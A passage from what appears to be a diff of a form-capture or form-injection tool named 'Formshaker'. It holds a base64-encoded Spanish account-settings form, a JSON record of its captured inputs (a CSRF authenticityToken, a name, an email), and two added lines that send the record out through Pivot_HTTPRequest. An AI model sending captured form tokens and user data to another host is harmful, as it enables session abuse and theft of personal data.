iB2YWx1ZT0iVFoiPlRhbnphbmlhPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iVEoiPlRheWlraXN0w6FuPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iSU8iPlRlcnJpdG9yaW8gQnJpdMOhbmljbyBkZWwgT2PDqWFubyDDjW5kaWNvPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iVEYiPlRlcnJpdG9yaW9zIEF1c3RyYWxlcyB5IEFudMOhcnRpY29zIEZyYW5jZXNlczwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IlRQIj5UaW1vciBPcmllbnRhbDwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IlRHIj5Ub2dvPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iVEsiPlRva2VsYXU8L29wdGlvbj48b3B0aW9uIHZhbHVlPSJUTyI+VG9uZ2E8L29wdGlvbj48b3B0aW9uIHZhbHVlPSJUVCI+VHJpbmlkYWQgeSBUb2JhZ288L29wdGlvbj48b3B0aW9uIHZhbHVlPSJUTiI+VMO6bmV6PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iVE0iPlR1cmttZW5pc3TDoW48L29wdGlvbj48b3B0aW9uIHZhbHVlPSJUUiI+VHVycXXDrWE8L29wdGlvbj48b3B0aW9uIHZhbHVlPSJUViI+VHV2YWx1PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iVUEiPlVjcmFuaWE8L29wdGlvbj48b3B0aW9uIHZhbHVlPSJVRyI+VWdhbmRhPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iVVkiPlVydWd1YXk8L29wdGlvbj48b3B0aW9uIHZhbHVlPSJVWiI+VXpiZWtpc3TDoW48L29wdGlvbj48b3B0aW9uIHZhbHVlPSJWVSI+VmFudWF0dTwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IlZFIj5WZW5lenVlbGE8L29wdGlvbj48b3B0aW9uIHZhbHVlPSJWTiI+VmlldG5hbTwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IldGIj5XYWxsaXMgeSBGdXR1bmE8L29wdGlvbj48b3B0aW9uIHZhbHVlPSJZRSI+WWVtZW48L29wdGlvbj48b3B0aW9uIHZhbHVlPSJESiI+WWlidXRpPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iWk0iPlphbWJpYTwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IlpXIj5aaW1iYWJ1ZTwvb3B0aW9uPjwvc2VsZWN0PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAgbWFyZ2luLWJvdHRvbS0yMCI+PHNwYW4gY2xhc3M9ImlucHV0LWdyb3VwLWFkZG9uIj4jPC9zcGFuPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZm9ybS1jb250cm9sIiBwbGFjZWhvbGRlcj0iTklGIiBuYW1lPSJuaWYiIGlkPSJuaWYiIHZhbHVlPSIiPgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cCBtYXJnaW4tYm90dG9tLTIwIj48c3BhbiBjbGFzcz0iaW5wdXQtZ3JvdXAtYWRkb24iPjxpIGNsYXNzPSJpY29uLWJyaWVmY2FzZSI+PC9pPjwvc3Bhbj4KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCIgcGxhY2Vob2xkZXI9IkVtcHJlc2EiIG5hbWU9ImNvbXBhbnkiIGlkPSJjb21wYW55IiB2YWx1ZT0iIj4KICAgIDwvZGl2PgoKICAgIDxsYWJlbCBmb3I9InVzZXJMYW5nIiBjbGFzcz0iIj5JZGlvbWEgcHJlZmVyaWRvIHBhcmEgbGFzIGNvbXVuaWNhY2lvbmVzPC9sYWJlbD4KICAgIDxkaXYgY2xhc3M9ImlucHV0LWdyb3VwIG1hcmdpbi1ib3R0b20tMjAiPgogICAgICAgIDxzcGFuIGNsYXNzPSJpbnB1dC1ncm91cC1hZGRvbiI+PGkgY2xhc3M9Imljb24tY29tbWVudCI+PC9pPjwvc3Bhbj4KICAgICAgICA8ZGl2IGNsYXNzPSJzZWxlY3QyLWNvbnRhaW5lciBqcy1zZWxlY3QyIiBpZD0iczJpZF91c2VyTGFuZyI+PGEgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBjbGFzcz0ic2VsZWN0Mi1jaG9pY2UiIHRhYmluZGV4PSItMSI+ICAgPHNwYW4gY2xhc3M9InNlbGVjdDItY2hvc2VuIiBpZD0ic2VsZWN0Mi1jaG9zZW4tMiI+RGV1dHNjaDwvc3Bhbj48YWJiciBjbGFzcz0ic2VsZWN0Mi1zZWFyY2gtY2hvaWNlLWNsb3NlIj48L2FiYnI+ICAgPHNwYW4gY2xhc3M9InNlbGVjdDItYXJyb3ciIHJvbGU9InByZXNlbnRhdGlvbiI+PGIgcm9sZT0icHJlc2VudGF0aW9uIj48L2I+PC9zcGFuPjwvYT48bGFiZWwgZm9yPSJzMmlkX2F1dG9nZW4yIiBjbGFzcz0ic2VsZWN0Mi1vZmZzY3JlZW4iPklkaW9tYSBwcmVmZXJpZG8gcGFyYSBsYXMgY29tdW5pY2FjaW9uZXM8L2xhYmVsPjxpbnB1dCBjbGFzcz0ic2VsZWN0Mi1mb2N1c3NlciBzZWxlY3QyLW9mZnNjcmVlbiIgdHlwZT0idGV4dCIgYXJpYS1oYXNwb3B1cD0idHJ1ZSIgcm9sZT0iYnV0dG9uIiBhcmlhLWxhYmVsbGVkYnk9InNlbGVjdDItY2hvc2VuLTIiIGlkPSJzMmlkX2F1dG9nZW4yIj48ZGl2IGNsYXNzPSJzZWxlY3QyLWRyb3Agc2VsZWN0Mi1kaXNwbGF5LW5vbmUgc2VsZWN0Mi13aXRoLXNlYXJjaGJveCI+ICAgPGRpdiBjbGFzcz0ic2VsZWN0Mi1zZWFyY2giPiAgICAgICA8bGFiZWwgZm9yPSJzMmlkX2F1dG9nZW4yX3NlYXJjaCIgY2xhc3M9InNlbGVjdDItb2Zmc2NyZWVuIj5JZGlvbWEgcHJlZmVyaWRvIHBhcmEgbGFzIGNvbXVuaWNhY2lvbmVzPC9sYWJlbD4gICAgICAgPGlucHV0IHR5cGU9InRleHQiIGF1dG9jb21wbGV0ZT0ib2ZmIiBhdXRvY29ycmVjdD0ib2ZmIiBhdXRvY2FwaXRhbGl6ZT0ib2ZmIiBzcGVsbGNoZWNrPSJmYWxzZSIgY2xhc3M9InNlbGVjdDItaW5wdXQiIHJvbGU9ImNvbWJvYm94IiBhcmlhLWV4cGFuZGVkPSJ0cnVlIiBhcmlhLWF1dG9jb21wbGV0ZT0ibGlzdCIgYXJpYS1vd25zPSJzZWxlY3QyLXJlc3VsdHMtMiIgaWQ9InMyaWRfYXV0b2dlbjJfc2VhcmNoIiBwbGFjZWhvbGRlcj0iIj4gICA8L2Rpdj4gICA8dWwgY2xhc3M9InNlbGVjdDItcmVzdWx0cyIgcm9sZT0ibGlzdGJveCIgaWQ9InNlbGVjdDItcmVzdWx0cy0yIj4gICA8L3VsPjwvZGl2PjwvZGl2PjxzZWxlY3QgaWQ9InVzZXJMYW5nIiBuYW1lPSJ1c2VyTGFuZyIgY2xhc3M9ImpzLXNlbGVjdDIiIHRhYmluZGV4PSItMSIgdGl0bGU9IklkaW9tYSBwcmVmZXJpZG8gcGFyYSBsYXMgY29tdW5pY2FjaW9uZXMiIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+CiAgICAgICAgICAgIDxvcHRpb24gdmFsdWU9IkVTIj5Fc3Bhw7FvbDwvb3B0aW9uPgogICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSJFTiI+RW5nbGlzaDwvb3B0aW9uPgogICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSJQVCI+UG9ydHVndcOqczwvb3B0aW9uPgogICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSJERSIgc2VsZWN0ZWQ9InNlbGVjdGVkIj5EZXV0c2NoPC9vcHRpb24+CiAgICAgICAgPC9zZWxlY3Q+CiAgICA8L2Rpdj4KCiAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cCBtYXJnaW4tYm90dG9tLTIwIj4KICAgICAgICA8ZGl2IGNsYXNzPSJjaGVja2VyIiBpZD0idW5pZm9ybS1jb21tdW5pY2F0aW9uc0FsbG93ZWQiPjxzcGFuPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0iY29tbXVuaWNhdGlvbnNBbGxvd2VkIiBpZD0iY29tbXVuaWNhdGlvbnNBbGxvd2VkIiB2YWx1ZT0idHJ1ZSI+PC9zcGFuPjwvZGl2PgogICAgICAgIDxzcGFuPgogICAgICAgICAgICBEZXNlbyByZWNpYmlyIGNvbXVuaWNhY2lvbmVzIGRlIE1hcmtldGluZyB5IFByb21vY2lvbmVzIHbDrWEgZW1haWwuCiAgICAgICAgPC9zcGFuPgogICAgPC9kaXY+Cgo8ZGl2PgogICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJzdWJtaXQiPkd1YXJkYXIgY2FtYmlvczwvYnV0dG9uPgogICAgPGEgaHJlZj0iI3JlbW92ZUFjY291bnRNb2RhbCIgZGF0YS10b2dnbGU9Im1vZGFsIiBjbGFzcz0iYnRuIGJ0bi1kYW5nZXIgcm91bmRlZF9idXR0b24iPkJvcnJhciBjdWVudGE8L2E+CiAgICA8ZGl2IGNsYXNzPSJjbGVhcmZpeCI+PC9kaXY+CjwvZGl2PgogICAgPGRpdiBjbGFzcz0iY2xlYXJmaXgiPjwvZGl2PgoKPGRpdiBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyIj4KICAgIDxhIGhyZWY9Ii93d3cvZGV2ZWxvcGVyQXJlYSI+Vm9sdmVyIGFsIMOBcmVhIGRlIERlc2Fycm9sbGFkb3JlczwvYT4KPC9kaXY+CgoKPC9mb3JtPjwvY2VudGVyPg==", "sessionID": "Formshaker-8303", "executionID": 125, "time": "6%20Feb%202021%2018%3A0%3A33", "creationdate": {"$date": 1612638033868}, "used": true, "inject": false, "originalInputs": [{"Type": "hidden", "name": "authenticityToken", "value": "142181d316d0e21f9b7c9516e2af197d47542d60", "modified": false}, {"Type": "text", "name": "name", "value": "Paco", "modified": false}, {"Type": "text", "name": "notificationEmail", "value": "zdmgserhirlffhvyya@awdrt.org", "modified": false}, {"Type": "text", "name": "address", "value": "", "modified": false}, {"Type": "select-one", "name": "country", "value": "[{\"value\":\"\",\"text\":\"\",\"selected\":true},{\"value\":\"EMPTY\",\"text\":\"Pa\u00eds\",\"selected\":false},{\"value\":\"AF\",\"text\":\"Afganist\u00e1n\",\"selected\":false},{\"value\":\"AL\",\"text\":\"Albania\",\"selected\":false},{\"value\":\"DE\",\"text\":\"Alemania\",\"selected\":false},{\"value\":\"AD\",\"text\":\"Andorra\",\"selected\":false},{\"value\":\"AO\",\"text\":\"Angola\",\"selected\":false},{\"value\":\"AI\",\"text\":\"Anguila\",\"selected\":false},{\"value\":\"AQ\",\"text\":\"Ant\u00e1rtida\",\"selected\":false},{\"value\":\"AG\",\"text\":\"Antigua y Barbuda\",\"selected\":false},{\"value\":\"AN\",\"text\":\"Antillas Neerlandesas\",\"selected\":false},{\"value\":\"SA\",\"text\":\"Arabia Saudita\",\"selected\":false},{\"value\":\"DZ\",\"text\":\"Argelia\",\"selected\":false},{\"value\":\"AR\",\"text\":\"Argentina\",\"selected\":false},{\"value\":\"AM\",\"text\":\"Armenia\",\"selected\":false},{\"value\":\"AW\",\"text\":\"Aruba\",\"selected\":false},{\"value\":\"AU\",\"text\":\"Australia\",\"selected\":false},{\"value\":\"AT\",\"text\":\"Austria\",\"selected\":false},{\"value\":\"AZ\",\"text\":\"Azerbaiy\u00e1n\",\"selected\":false},{\"value\":\"BS\",\"text\":\"Bahamas\",\"selected\":false},{\"value\":\"BD\",\"text\":\"Bangladesh\",\"selected\":false},{\"value\":\"BB\",\"text\":\"Barbados\",\"selected\":false},{\"value\":\"BH\",\"text\":\"Bahr\u00e9in\",\"selected\":false},{\"value\":\"BE\",\"text\":\"B\u00e9lgica\",\"selected\":false},{\"value\":\"BZ\",\"text\":\"Belice\",\"selected\":false},{\"value\":\"BJ\",\"text\":\"Ben\u00edn\",\"selected\":false},{\"value\":\"BM\",\"text\":\"Bermudas\",\"selected\":false},{\"value\":\"BY\",\"text\":\"Bielorrusia\",\"selected\":false},{\"value\":\"BO\",\"text\":\"Bolivia\",\"selected\":false},{\"value\":\"BA\",\"text\":\"Bosnia-Herzegovina\",\"selected\":false},{\"value\":\"BW\",\"text\":\"Botsuana\",\"selected\":false},{\"value\":\"BR\",\"text\":\"Brasil\",\"selected\":false},{\"value\":\"BN\",\"text\":\"Brunei\",\"selected\":false},{\"value\":\"BG\",\"text\":\"Bulgaria\",\"selected\":false},{\"value\":\"BF\",\"text\":\"Burkina Faso\",\"selected\":false},{\"value\":\"BI\",\"text\":\"Burundi\",\"selected\":false},{\"value\":\"BT\",\"text\":\"But\u00e1n\",\"selected\":false},{\"value\":\"CV\",\"text\":\"Cabo Verde\",\"selected\":false},{\"value\":\"KH\",\"text\":\"Camboya\",\"selected\":false},{\"value\":\"CM\",\"text\":\"Camer\u00fan\",\"selected\":false},{\"value\":\"CA\",\"text\":\"Canad\u00e1\",\"selected\":false},{\"value\":\"TD\",\"text\":\"Chad\",\"selected\":false},{\"value\":\"CL\",\"text\":\"Chile\",\"selected\":false},{\"value\":\"CN\",\"text\":\"China\",\"selected\":false},{\"value\":\"CY\",\"text\":\"Chipre\",\"selected\":false},{\"value\":\"VA\",\"text\":\"Ciudad del Vaticano\",\"selected\":false},{\"value\":\"CO\",\"text\":\"Colombia\",\"selected\":false},{\"value\":\"KM\",\"text\":\"Comoras\",\"selected\":false},{\"value\":\"KP\",\"text\":\"Corea del Norte\",\"selected\":false},{\"value\":\"KR\",\"text\":\"Corea del Sur\",\"selected\":false},{\"value\":\"CI\",\"text\":\"Costa de Marfil\",\"selected\":false},{\"value\":\"CR\",\"text\":\"Costa Rica\",\"selected\":false},{\"value\":\"HR\",\"text\":\"Croacia\",\"selected\":false},{\"value\":\"CU\",\"text\":\"Cuba\",\"selected\":false},{\"value\":\"DK\",\"text\":\"Dinamarca\",\"selected\":false},{\"value\":\"DM\",\"text\":\"Dominica\",\"selected\":false},{\"value\":\"EC\",\"text\":\"Ecuador\",\"selected\":false},{\"value\":\"EG\",\"text\":\"Egipto\",\"selected\":false},{\"value\":\"SV\",\"text\":\"El Salvador\",\"selected\":false},{\"value\":\"AE\",\"text\":\"Emiratos \u00c1rabes Unidos\",\"selected\":false},{\"value\":\"ER\",\"text\":\"Eritrea\",\"selected\":false},{\"value\":\"SK\",\"text\":\"Eslovaquia\",\"selected\":false},{\"value\":\"SI\",\"text\":\"Eslovenia\",\"selected\":false},{\"value\":\"ES\",\"text\":\"Espa\u00f1a\",\"selected\":false},{\"value\":\"US\",\"text\":\"Estados Unidos\",\"selected\":false},{\"value\":\"EE\",\"text\":\"Estonia\",\"selected\":false},{\"value\":\"ET\",\"text\":\"Etiop\u00eda\",\"selected\":false},{\"value\":\"FJ\",\"text\":\"Fiji\",\"selected\":false},{\"value\":\"PH\",\"text\":\"Filipinas\",\"selected\":false},{\"value\":\"FI\",\"text\":\"Finlandia\",\"selected\":false},{\"value\":\"FX\",\"text\":\"Francia Metropolitana\",\"selected\":false},{\"value\":\"FR\",\"text\":\"Francia\",\"selected\":false},{\"value\":\"GA\",\"text\":\"Gab\u00f3n\",\"selected\":false},{\"value\":\"GM\",\"text\":\"Gambia\",\"selected\":false},{\"value\":\"GE\",\"text\":\"Georgia\",\"selected\":false},{\"value\":\"GH\",\"text\":\"Ghana\",\"selected\":false},{\"value\":\"GI\",\"text\":\"Gibraltar\",\"selected\":false},{\"value\":\"GD\",\"text\":\"Granada\",\"selected\":false},{\"value\":\"GR\",\"text\":\"Grecia\",\"selected\":false},{\"value\":\"GL\",\"text\":\"Groenlandia\",\"selected\":false},{\"value\":\"GP\",\"text\":\"Guadalupe\",\"selected\":false},{\"value\":\"GU\",\"text\":\"Guam\",\"selected\":false},{\"value\":\"GT\",\"text\":\"Guatemala\",\"selected\":false},{\"value\":\"GF\",\"text\":\"Guayana Francesa\",\"selected\":false},{\"value\":\"GQ\",\"text\":\"Guinea Ecuatorial\",\"selected\":false},{\"value\":\"GN\",\"text\":\"Guinea\",\"selected\":false},{\"value\":\"GW\",\"text\":\"Guinea-Bissau\",\"selected\":false},{\"value\":\"GY\",\"text\":\"Guyana\",\"selected\":false},{\"value\":\"HT\",\"text\":\"Hait\u00ed\",\"selected\":false},{\"value\":\"HN\",\"text\":\"Honduras\",\"selected\":false},{\"value\":\"HK\",\"text\":\"Hong Kong\",\"selected\":false},{\"value\":\"HU\",\"text\":\"Hungr\u00eda\",\"selected\":false},{\"value\":\"IN\",\"text\":\"India\",\"selected\":false},{\"value\":\"ID\",\"text\":\"Indonesia\",\"selected\":false},{\"value\":\"IQ\",\"text\":\"Irak\",\"selected\":false},{\"value\":\"IR\",\"text\":\"Ir\u00e1n\",\"selected\":false},{\"value\":\"IE\",\"text\":\"Irlanda\",\"selected\":false},{\"value\":\"BV\",\"text\":\"Isla Bouvet\",\"selected\":false},{\"value\":\"CX\",\"text\":\"Isla de Navidad\",\"selected\":false},{\"value\":\"NF\",\"text\":\"Isla Norfolk\",\"selected\":false},{\"value\":\"IS\",\"text\":\"Islandia\",\"selected\":false},{\"value\":\"KY\",\"text\":\"Islas Caim\u00e1n\",\"selected\":false},{\"value\":\"CC\",\"text\":\"Islas Cocos\",\"selected\":false},{\"value\":\"CK\",\"text\":\"Islas Cook\",\"selected\":false},{\"value\":\"FO\",\"text\":\"Islas Feroe\",\"selected\":false},{\"value\":\"GS\",\"text\":\"Islas Georgias del Sur y Sandwich del Sur\",\"selected\":false},{\"value\":\"HM\",\"text\":\"Islas Heard y McDonald\",\"selected\":false},{\"value\":\"FK\",\"text\":\"Islas Malvinas\",\"selected\":false},{\"value\":\"MP\",\"text\":\"Islas Marianas del Norte\",\"selected\":false},{\"value\":\"MH\",\"text\":\"Islas Marshall\",\"selected\":false},{\"value\":\"PN\",\"text\":\"Islas Pitcairn\",\"selected\":false},{\"value\":\"SB\",\"text\":\"Islas Salom\u00f3n\",\"selected\":false},{\"value\":\"TC\",\"text\":\"Islas Turcas y Caicos\",\"selected\":false},{\"value\":\"UM\",\"text\":\"Islas Ultramarinas Menores de Estados Unidos\",\"selected\":false},{\"value\":\"VG\",\"text\":\"Islas V\u00edrgenes Brit\u00e1nicas\",\"selected\":false},{\"value\":\"VI\",\"text\":\"Islas V\u00edrgenes de los Estados Unidos\",\"selected\":false},{\"value\":\"IL\",\"text\":\"Israel\",\"selected\":false},{\"value\":\"IT\",\"text\":\"Italia\",\"selected\":false},{\"value\":\"JM\",\"text\":\"Jamaica\",\"selected\":false},{\"value\":\"JP\",\"text\":\"Jap\u00f3n\",\"selected\":false},{\"value\":\"JO\",\"text\":\"Jordania\",\"selected\":false},{\"value\":\"KZ\",\"text\":\"Kazajist\u00e1n\",\"selected\":false},{\"value\":\"KE\",\"text\":\"Kenia\",\"selected\":false},{\"value\":\"KG\",\"text\":\"Kirguist\u00e1n\",\"selected\":false},{\"value\":\"KI\",\"text\":\"Kiribati\",\"selected\":false},{\"value\":\"KW\",\"text\":\"Kuwait\",\"selected\":false},{\"value\":\"LA\",\"text\":\"Laos\",\"selected\":false},{\"value\":\"LS\",\"text\":\"Lesoto\",\"selected\":false},{\"value\":\"LV\",\"text\":\"Letonia\",\"selected\":false},{\"value\":\"LB\",\"text\":\"L\u00edbano\",\"selected\":false},{\"value\":\"LR\",\"text\":\"Liberia\",\"selected\":false},{\"value\":\"LY\",\"text\":\"Libia\",\"selected\":false},{\"value\":\"LI\",\"text\":\"Liechtenstein\",\"selected\":false},{\"value\":\"LT\",\"text\":\"Lituania\",\"selected\":false},{\"value\":\"LU\",\"text\":\"Luxemburgo\",\"selected\":false},{\"value\":\"MO\",\"text\":\"Macao\",\"selected\":false},{\"value\":\"MG\",\"text\":\"Madagascar\",\"selected\":false},{\"value\":\"MY\",\"text\":\"Malasia\",\"selected\":false},{\"value\":\"MW\",\"text\":\"Malawi\",\"selected\":false},{\"value\":\"MV\",\"text\":\"Maldivas\",\"selected\":false},{\"value\":\"ML\",\"text\":\"Mal\u00ed\",\"selected\":false},{\"value\":\"MT\",\"text\":\"Malta\",\"selected\":false},{\"value\":\"MA\",\"text\":\"Marruecos\",\"selected\":false},{\"value\":\"MQ\",\"text\":\"Martinica\",\"selected\":false},{\"value\":\"MU\",\"text\":\"Mauricio\",\"selected\":false},{\"value\":\"MR\",\"text\":\"Mauritania\",\"selected\":false},{\"value\":\"YT\",\"text\":\"Mayotte\",\"selected\":false},{\"value\":\"MX\",\"text\":\"M\u00e9xico\",\"selected\":false},{\"value\":\"FM\",\"text\":\"Micronesia\",\"selected\":false},{\"value\":\"MD\",\"text\":\"Moldavia\",\"selected\":false},{\"value\":\"MC\",\"text\":\"M\u00f3naco\",\"selected\":false},{\"value\":\"MN\",\"text\":\"Mongolia\",\"selected\":false},{\"value\":\"ME\",\"text\":\"Montenegro\",\"selected\":false},{\"value\":\"MS\",\"text\":\"Montserrat\",\"selected\":false},{\"value\":\"MZ\",\"text\":\"Mozambique\",\"selected\":false},{\"value\":\"MM\",\"text\":\"Myanmar\",\"selected\":false},{\"value\":\"NA\",\"text\":\"Namibia\",\"selected\":false},{\"value\":\"NR\",\"text\":\"Nauru\",\"selected\":false},{\"value\":\"NP\",\"text\":\"Nepal\",\"selected\":false},{\"value\":\"NI\",\"text\":\"Nicaragua\",\"selected\":false},{\"value\":\"NE\",\"text\":\"N\u00edger\",\"selected\":false},{\"value\":\"NG\",\"text\":\"Nigeria\",\"selected\":false},{\"value\":\"NU\",\"text\":\"Niue\",\"selected\":false},{\"value\":\"NO\",\"text\":\"Noruega\",\"selected\":false},{\"value\":\"NC\",\"text\":\"Nueva Caledonia\",\"selected\":false},{\"value\":\"NZ\",\"text\":\"Nueva Zelanda\",\"selected\":false},{\"value\":\"OM\",\"text\":\"Om\u00e1n\",\"selected\":false},{\"value\":\"NL\",\"text\":\"Pa\u00edses Bajos\",\"selected\":false},{\"value\":\"PK\",\"text\":\"Pakist\u00e1n\",\"selected\":false},{\"value\":\"PW\",\"text\":\"Palaos\",\"selected\":false},{\"value\":\"PS\",\"text\":\"Palestina\",\"selected\":false},{\"value\":\"PA\",\"text\":\"Panam\u00e1\",\"selected\":false},{\"value\":\"PG\",\"text\":\"Pap\u00faa Nueva Guinea\",\"selected\":false},{\"value\":\"PY\",\"text\":\"Paraguay\",\"selected\":false},{\"value\":\"PE\",\"text\":\"Per\u00fa\",\"selected\":false},{\"value\":\"PF\",\"text\":\"Polinesia Francesa\",\"selected\":false},{\"value\":\"PL\",\"text\":\"Polonia\",\"selected\":false},{\"value\":\"PT\",\"text\":\"Portugal\",\"selected\":false},{\"value\":\"PR\",\"text\":\"Puerto Rico\",\"selected\":false},{\"value\":\"QA\",\"text\":\"Qatar\",\"selected\":false},{\"value\":\"GB\",\"text\":\"Reino Unido\",\"selected\":false},{\"value\":\"CF\",\"text\":\"Rep\u00fablica Centroafricana\",\"selected\":false},{\"value\":\"CZ\",\"text\":\"Rep\u00fablica Checa\",\"selected\":false},{\"value\":\"MK\",\"text\":\"Rep\u00fablica de Macedonia\",\"selected\":false},{\"value\":\"CG\",\"text\":\"Rep\u00fablica del Congo\",\"selected\":false},{\"value\":\"CD\",\"text\":\"Rep\u00fablica Democr\u00e1tica del Congo\",\"selected\":false},{\"value\":\"DO\",\"text\":\"Rep\u00fablica Dominicana\",\"selected\":false},{\"value\":\"RE\",\"text\":\"Reuni\u00f3n\",\"selected\":false},{\"value\":\"RW\",\"text\":\"Ruanda\",\"selected\":false},{\"value\":\"RO\",\"text\":\"Ruman\u00eda\",\"selected\":false},{\"value\":\"RU\",\"text\":\"Rusia\",\"selected\":false},{\"value\":\"EH\",\"text\":\"Sahara Occidental\",\"selected\":false},{\"value\":\"AS\",\"text\":\"Samoa Americana\",\"selected\":false},{\"value\":\"WS\",\"text\":\"Samoa\",\"selected\":false},{\"value\":\"KN\",\"text\":\"San Crist\u00f3bal y Nieves\",\"selected\":false},{\"value\":\"SM\",\"text\":\"San Marino\",\"selected\":false},{\"value\":\"PM\",\"text\":\"San Pedro y Miquel\u00f3n\",\"selected\":false},{\"value\":\"VC\",\"text\":\"San Vicente y las Granadinas\",\"selected\":false},{\"value\":\"SH\",\"text\":\"Santa Helena\",\"selected\":false},{\"value\":\"LC\",\"text\":\"Santa Luc\u00eda\",\"selected\":false},{\"value\":\"ST\",\"text\":\"Santo Tom\u00e9 y Pr\u00edncipe\",\"selected\":false},{\"value\":\"SN\",\"text\":\"Senegal\",\"selected\":false},{\"value\":\"RS\",\"text\":\"Serbia\",\"selected\":false},{\"value\":\"SC\",\"text\":\"Seychelles\",\"selected\":false},{\"value\":\"SL\",\"text\":\"Sierra Leona\",\"selected\":false},{\"value\":\"SG\",\"text\":\"Singapur\",\"selected\":false},{\"value\":\"SY\",\"text\":\"Siria\",\"selected\":false},{\"value\":\"SO\",\"text\":\"Somalia\",\"selected\":false},{\"value\":\"LK\",\"text\":\"Sri Lanka\",\"selected\":false},{\"value\":\"SZ\",\"text\":\"Suazilandia\",\"selected\":false},{\"value\":\"ZA\",\"text\":\"Sud\u00e1frica\",\"selected\":false},{\"value\":\"SD\",\"text\":\"Sud\u00e1n\",\"selected\":false},{\"value\":\"SE\",\"text\":\"Suecia\",\"selected\":false},{\"value\":\"CH\",\"text\":\"Suiza\",\"selected\":false},{\"value\":\"SR\",\"text\":\"Surinam\",\"selected\":false},{\"value\":\"SJ\",\"text\":\"Svalbard y Jan Mayen\",\"selected\":false},{\"value\":\"TH\",\"text\":\"Tailandia\",\"selected\":false},{\"value\":\"TW\",\"text\":\"Taiw\u00e1n\",\"selected\":false},{\"value\":\"TZ\",\"text\":\"Tanzania\",\"selected\":false},{\"value\":\"TJ\",\"text\":\"Tayikist\u00e1n\",\"selected\":false},{\"value\":\"IO\",\"text\":\"Territorio Brit\u00e1nico del Oc\u00e9ano \u00cdndico\",\"selected\":false},{\"value\":\"TF\",\"text\":\"Territorios Australes y Ant\u00e1rticos Franceses\",\"selected\":false},{\"value\":\"TP\",\"text\":\"Timor Oriental\",\"selected\":false},{\"value\":\"TG\",\"text\":\"Togo\",\"selected\":false},{\"value\":\"TK\",\"text\":\"Tokelau\",\"selected\":false},{\"value\":\"TO\",\"text\":\"Tonga\",\"selected\":false},{\"value\":\"TT\",\"text\":\"Trinidad y Tobago\",\"selected\":false},{\"value\":\"TN\",\"text\":\"T\u00fanez\",\"selected\":false},{\"value\":\"TM\",\"text\":\"Turkmenist\u00e1n\",\"selected\":false},{\"value\":\"TR\",\"text\":\"Turqu\u00eda\",\"selected\":false},{\"value\":\"TV\",\"text\":\"Tuvalu\",\"selected\":false},{\"value\":\"UA\",\"text\":\"Ucrania\",\"selected\":false},{\"value\":\"UG\",\"text\":\"Uganda\",\"selected\":false},{\"value\":\"UY\",\"text\":\"Uruguay\",\"selected\":false},{\"value\":\"UZ\",\"text\":\"Uzbekist\u00e1n\",\"selected\":false},{\"value\":\"VU\",\"text\":\"Vanuatu\",\"selected\":false},{\"value\":\"VE\",\"text\":\"Venezuela\",\"selected\":false},{\"value\":\"VN\",\"text\":\"Vietnam\",\"selected\":false},{\"value\":\"WF\",\"text\":\"Wallis y Futuna\",\"selected\":false},{\"value\":\"YE\",\"text\":\"Yemen\",\"selected\":false},{\"value\":\"DJ\",\"text\":\"Yibuti\",\"selected\":false},{\"value\":\"ZM\",\"text\":\"Zambia\",\"selected\":false},{\"value\":\"ZW\",\"text\":\"Zimbabue\",\"selected\":false}]", "defaultValue": "", "modified": false}, {"Type": "text", "name": "nif", "value": "", "modified": false}, {"Type": "text", "name": "company", "value": "", "modified": false}, {"Type": "select-one", "name": "userLang", "value": "[{\"value\":\"ES\",\"text\":\"Espa\u00f1ol\",\"selected\":false},{\"value\":\"EN\",\"text\":\"English\",\"selected\":false},{\"value\":\"PT\",\"text\":\"Portugu\u00eas\",\"selected\":false},{\"value\":\"DE\",\"text\":\"Deutsch\",\"selected\":true}]", "defaultValue": "DE", "modified": false}, {"Type": "checkbox", "name": "communicationsAllowed", "value": "true", "defaultValue": "", "pattern": "", "checked": false, "modified": false}]}]
+payloads=JSON.stringify(data);
+Pivot_HTTPRequest(payloads);
